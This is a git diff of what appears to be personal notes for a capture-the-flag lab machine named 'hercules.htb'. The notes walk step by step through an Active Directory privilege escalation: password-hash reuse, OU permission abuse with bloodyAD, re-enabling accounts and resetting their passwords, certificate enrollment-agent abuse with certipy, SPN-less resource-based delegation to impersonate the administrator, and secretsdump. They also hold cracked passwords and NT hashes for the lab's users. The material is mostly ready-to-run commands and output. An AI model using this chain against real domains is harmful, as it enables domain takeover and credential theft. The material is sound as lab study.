@@ -84,6 +84,8 @@ natalie.a : Prettyprincess123!
 bob.w     : 8a65c74e8f0073babbfac6725c66cc3f
 stephen.m : 9aaaedcb19e612216a2dac9badb3c210
 auditor   : Prettyprincess123!   ***
+ashley.b  : aad3b435b51404eeaad3b435b51404ee:
+			1e719fbfddd226da74f644eac9df7fd2
 ```
 
 
@@ -105,7 +107,38 @@ bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'aud
 
 source tmp.auditor
 getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
-evil-winrm -i "$IP" -u "$USER" -p "$PASSWORD"
+export KRB5CCNAME=auditor.ccache
+#evil-winrm -i "$IP" -u "$USER" -p "$PASSWORD"
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add genericAll  'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB'  "$USER"
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove uac 'fernando.r' -f ACCOUNTDISABLE
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'fernando.r' 'Prettyprincess123!'
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb'  'CN=IT Support,OU=DOMAIN GROUPS,OU=DCHERCULES,DC=HERCULES,DC=HTB'
+_____
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove uac 'iis_administrator' -f ACCOUNTDISABLE
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'iis_administrator' 'Prettyprincess123!'
+
+source tmp.fernando.r
+getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
+export KRB5CCNAME=fernando.r.ccache
+certipy req -u "$USER"@"$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$DC" -ca 'CA-HERCULES' -template 'EnrollmentAgent' -k
+
+source tmp.ashley.b
+getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD" -hashes ":$HASH"
+export KRB5CCNAME=ashley.b.ccache
+
+source tmp.iis.administrator
+getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
+export KRB5CCNAME=iis_administrator.ccache
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" set password 'iis_webserver$' 'Prettyprincess123!'
+
+source tmp.iis_webserver$
+getTGT.py -hashes :$(pypykatz crypto nt 'Prettyprincess123!') 'hercules.htb/iis_webserver$'
+describeTicket.py 'iis_webserver$.ccache' | grep 'Ticket Session Key'
+changepasswd.py -newhashes :49cc051d26c5dff22cfede501a76bd89 'hercules.htb/iis_webserver$:Prettyprincess123!@dc.hercules.htb' -k
+KRB5CCNAME=./iis_webserver\$.ccache impacket-getST -u2u -impersonate 'administrator' -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb/iis_webserver$'
+
+export administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+secretsdump.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC" -k -no-pass
 
 ```
 
@@ -163,10 +196,12 @@ KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' 
 
 KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'iis_administrator' -f ACCOUNTDISABLE
 
-KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'iis_administrator' 'Password123!'
 
+KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'iis_administrator' 'Password123!'
 impacket-getTGT 'hercules.htb/iis_administrator:Password123!'
 KRB5CCNAME=./iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'iis_administrator' -k set password iis_webserver$ 'Password123!'
+
+
 impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123!') 'hercules.htb/iis_webserver$'
 impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key'
 impacket-changepasswd -newhashes :473ef1842b6fbbdd57d98817f6c90c7d 'hercules.htb/iis_webserver$:Password123!@dc.hercules.htb' -k
@@ -177,7 +212,10 @@ KRB5CCNAME=./iis_webserver\$.ccache impacket-getST -u2u -impersonate 'administra
 
 ```
 ------------------------------------------------------------------------- ------------------------------------------------------------------------- ------------------------------------------------------------------------- #Privilege Escalation # Get TGT for stephen.m using NT hash: 
-getTGT.py HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210 KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -k set password Auditor 'Prettyprincess123!' KRB5CCNAME=stephen.m.ccache nxc smb dc.hercules.htb -k -u 'auditor' -p 'Prettyprincess123!' --generate-tgt auditor # or getTGT.py 'HERCULES.HTB/auditor:Prettyprincess123!' ## get user.txt !!!!! KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'auditor' [+] auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'fernando.r' 'Pretty123!' [+] Password changed successfully! KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'fernando.r' -f ACCOUNTDISABLE [-] ['ACCOUNTDISABLE'] property flags removed from FERNANDO.R's userAccountControl KRB5CCNAME=./auditor.ccache nxc smb dc.hercules.htb -k -u 'FERNANDO.R' -p 'Pretty123!' --generate-tgt fernando.r KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom [*] Wrote certificate and private key to 'fernando.r.pfx' KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'User' -application-policies 'Client Authentication' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom [*] Wrote certificate and private key to 'ashley.b.pfx' KRB5CCNAME=./fernando.r.ccache certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.246.151 [*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2 ------------------------------------------------------------------------- ------------------------------------------------------------------------- --------------------------------------------------------------------------- #### - after you get to ashley.b first as auditor give IT support ga on FOREST MIGRATION ou - then start the scheduled task, it will remove admincount from iis_administrator - once again as auditor give yourself ga on FOREST MIGRATION ou and enable iis_administrator change pass, - as iis_administrator, reset pass on iis_webserver - iis_webserver has rbcd on dc but no spn, so do spnless rbcd to get root #### getTGT.py HERCULES.HTB/ashley.b -hashes :1e719fbfddd226da74f644eac9df7fd2 # or nxc smb dc.hercules.htb -u 'ashley.b' -H '1e719fbfddd226da74f644eac9df7fd2' -k --generate-tgt ashley.b # We grant GenericAll on Forest Migration OU to IT SUPPORT KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT' ### trigger the cleanup script from Ashley's shell ! # We grant GenericAll on Forest Migration OU to Auditor KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor' # Enable the iis_administrator account KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'iis_administrator' -f ACCOUNTDISABLE # Change password of iis_administrator account KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'iis_administrator' 'Password123!' # Grab the ticket for iis_administrator impacket-getTGT 'hercules.htb/iis_administrator:Password123!' KRB5CCNAME=./iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'iis_administrator' -k set password iis_webserver$ 'Password123!' # Get ticket for iis_webserver$ account impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123!') 'hercules.htb/iis_webserver$' # Get session key impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key' [*] Ticket Session Key : 473ef1842b6fbbdd57d98817f6c90c7d impacket-changepasswd -newhashes :473ef1842b6fbbdd57d98817f6c90c7d 'hercules.htb/iis_webserver$:Password123!@dc.hercules.htb' -k [*] Password was changed successfully. KRB5CCNAME=./iis_webserver\$.ccache impacket-getST -u2u -impersonate 'administrator' -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb/iis_webserver$' [*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+getTGT.py HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210 KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -k set password Auditor 'Prettyprincess123!' KRB5CCNAME=stephen.m.ccache nxc smb dc.hercules.htb -k -u 'auditor' -p 'Prettyprincess123!' --generate-tgt auditor # or getTGT.py 'HERCULES.HTB/auditor:Prettyprincess123!' ## get user.txt !!!!! KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'auditor' [+] auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'fernando.r' 'Pretty123!' [+] Password changed successfully! KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'fernando.r' -f ACCOUNTDISABLE [-] ['ACCOUNTDISABLE'] property flags removed from FERNANDO.R's userAccountControl KRB5CCNAME=./auditor.ccache nxc smb dc.hercules.htb -k -u 'FERNANDO.R' -p 'Pretty123!' --generate-tgt fernando.r KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom [*] Wrote certificate and private key to 'fernando.r.pfx' KRB5CCNAME=./fernando.r.ccache certipy-ad req -u 'fernando.r@hercules.htb' -k -target 'dc.hercules.htb' -dc-host 'dc.hercules.htb' -dc-ip 10.129.246.151 -ca 'CA-HERCULES' -template 'User' -application-policies 'Client Authentication' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom [*] Wrote certificate and private key to 'ashley.b.pfx' KRB5CCNAME=./fernando.r.ccache certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.246.151 [*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2 ------------------------------------------------------------------------- ------------------------------------------------------------------------- --------------------------------------------------------------------------- #### - after you get to ashley.b first as auditor give IT support ga on FOREST MIGRATION ou - then start the scheduled task, it will remove admincount from iis_administrator - once again as auditor give yourself ga on FOREST MIGRATION ou and enable iis_administrator change pass, - as iis_administrator, reset pass on iis_webserver - iis_webserver has rbcd on dc but no spn, so do spnless rbcd to get root #### getTGT.py HERCULES.HTB/ashley.b -hashes :1e719fbfddd226da74f644eac9df7fd2 # or nxc smb dc.hercules.htb -u 'ashley.b' -H '1e719fbfddd226da74f644eac9df7fd2' -k --generate-tgt ashley.b # We grant GenericAll on Forest Migration OU to IT SUPPORT KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT' ### trigger the cleanup script from Ashley's shell ! # We grant GenericAll on Forest Migration OU to Auditor KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor' # Enable the iis_administrator account KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k remove uac 'iis_administrator' -f ACCOUNTDISABLE # Change password of iis_administrator account KRB5CCNAME=./auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -k set password 'iis_administrator' 'Password123!' # Grab the ticket for iis_administrator impacket-getTGT 'hercules.htb/iis_administrator:Password123!' KRB5CCNAME=./iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'iis_administrator' -k set password iis_webserver$ 'Password123!' # Get ticket for iis_webserver$ account impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123!') 'hercules.htb/iis_webserver$' # Get session key impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key' [*] Ticket Session Key : 473ef1842b6fbbdd57d98817f6c90c7d impacket-changepasswd -newhashes :473ef1842b6fbbdd57d98817f6c90c7d 'hercules.htb/iis_webserver$:Password123!@dc.hercules.htb' -k [*] Password was changed successfully. KRB5CCNAME=./iis_webserver\$.ccache 
+
+impacket-getST -u2u -impersonate 'administrator' -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb/iis_webserver$' 
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
 ```
 
 
